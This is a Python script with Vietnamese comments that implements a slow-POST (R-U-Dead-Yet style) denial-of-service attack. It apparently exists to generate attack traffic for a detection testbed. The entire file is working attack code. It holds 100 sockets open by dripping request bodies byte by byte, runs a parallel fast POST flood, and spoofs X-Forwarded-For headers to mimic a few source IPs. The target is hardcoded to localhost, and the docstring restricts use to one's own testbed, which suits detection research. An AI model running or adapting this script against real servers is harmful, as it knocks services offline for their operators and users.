"""
experiments/attack_slow_post.py
CHỈ dùng để tấn công server localhost trong testbed của chính bạn.

4.1.2 - Slow POST (kiểu R-U-Dead-Yet): kết hợp 2 chiến thuật:
  1. Slow POST: gửi header đầy đủ (Content-Length nhỏ) nhưng nhỏ giọt body
     cực chậm để giữ connection/worker bị chiếm giữ lâu.
  2. Fast POST flood: song song gửi nhiều POST request hoàn tất nhanh với
     Content-Length nhỏ, tạo pattern bất thường (tỷ lệ POST cao, ít path
     đa dạng, inter_arrival đều đặn bất thường).

Cải tiến so với phiên bản cũ:
  - Giảm Content-Length xuống 50 bytes (gửi nhanh hơn, đủ để 1 số request
    hoàn tất và được ghi log bởi middleware)
  - Thêm fast POST workers chạy song song tạo ra lưu lượng POST bất thường
  - Thêm X-Forwarded-For giả lập ít IP (entropy thấp)

Chạy: python experiments/attack_slow_post.py
"""
import asyncio
import random
import socket
import threading
import time
from pathlib import Path

import aiohttp

TARGET_HOST = "localhost"
TARGET_PORT = 8000
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# --- Slow POST params ---
NUM_SLOW_SOCKETS = 100
BODY_LEN = 50           # Content-Length nhỏ hơn, để 1 số request hoàn tất
DRIP_INTERVAL_S = 0.3   # gửi 1 byte mỗi 0.3s (nhanh hơn trước)

# --- Fast POST flood params ---
FAST_POST_CONCURRENCY = 20
FAST_POST_RATE = 5       # req/s mỗi worker

DURATION_S = 60
NUM_FAKE_IPS = 4         # ít IP → ip_entropy thấp

LOG_DIR = Path(__file__).resolve().parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)


def make_fake_ip():
    return f"192.168.1.{random.randint(1, NUM_FAKE_IPS)}"


def init_slow_socket():
    """Mở 1 kết nối slow POST: gửi header đầy đủ, nhỏ giọt body."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    fake_ip = make_fake_ip()
    headers = (
        f"POST /cart?product_id={random.randint(1, 50)} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {BODY_LEN}\r\n"
        f"X-Forwarded-For: {fake_ip}\r\n"
        f"\r\n"
    )
    s.send(headers.encode())
    return s


def slow_post_thread(stop_event: threading.Event):
    """Thread chạy slow POST: mở nhiều socket, nhỏ giọt body."""
    sockets = []
    for _ in range(NUM_SLOW_SOCKETS):
        try:
            sockets.append(init_slow_socket())
        except OSError:
            pass
    print(f"  [Slow POST] Đã mở {len(sockets)} kết nối, nhỏ giọt body...")

    sent_bytes = {id(s): 0 for s in sockets}
    while not stop_event.is_set():
        for s in list(sockets):
            try:
                if sent_bytes[id(s)] < BODY_LEN:
                    s.send(b"a")
                    sent_bytes[id(s)] += 1
                else:
                    # Hoàn tất body → đóng và mở lại
                    s.close()
                    sockets.remove(s)
                    try:
                        new_s = init_slow_socket()
                        sockets.append(new_s)
                        sent_bytes[id(new_s)] = 0
                    except OSError:
                        pass
            except OSError:
                sockets.remove(s)
        time.sleep(DRIP_INTERVAL_S)

    for s in sockets:
        try:
            s.close()
        except OSError:
            pass


async def fast_post_worker(session, stop_at, fake_ip):
    """Worker gửi POST request nhỏ hoàn tất nhanh — tạo log POST bất thường."""
    headers = {"X-Forwarded-For": fake_ip}
    interval = 1.0 / FAST_POST_RATE
    paths = ["/cart?product_id=1", "/cart?product_id=2", "/cart?product_id=3"]
    while time.time() < stop_at:
        try:
            async with session.post(
                TARGET_URL + random.choice(paths), headers=headers
            ) as resp:
                await resp.read()
        except Exception:
            pass
        await asyncio.sleep(interval)


async def fast_post_flood(stop_at):
    """Chạy nhiều fast POST workers song song."""
    fake_ips = [make_fake_ip() for _ in range(FAST_POST_CONCURRENCY)]
    async with aiohttp.ClientSession() as session:
        workers = [
            fast_post_worker(session, stop_at, ip) for ip in fake_ips
        ]
        await asyncio.gather(*workers)


def main():
    start = time.time()
    with open(LOG_DIR / "attack_start.log", "a") as f:
        f.write(f"slow_post_start\t{start}\n")

    stop_at = start + DURATION_S
    stop_event = threading.Event()

    # Chạy slow POST thread nền
    slow_thread = threading.Thread(target=slow_post_thread, args=(stop_event,))
    slow_thread.start()

    # Chạy fast POST flood async (chính)
    print(f"  [Fast POST] {FAST_POST_CONCURRENCY} workers, {FAST_POST_RATE} req/s/worker")
    asyncio.run(fast_post_flood(stop_at))

    stop_event.set()
    slow_thread.join(timeout=5)
    print(f"Slow POST attack kết thúc sau {DURATION_S}s")


if __name__ == "__main__":
    main()
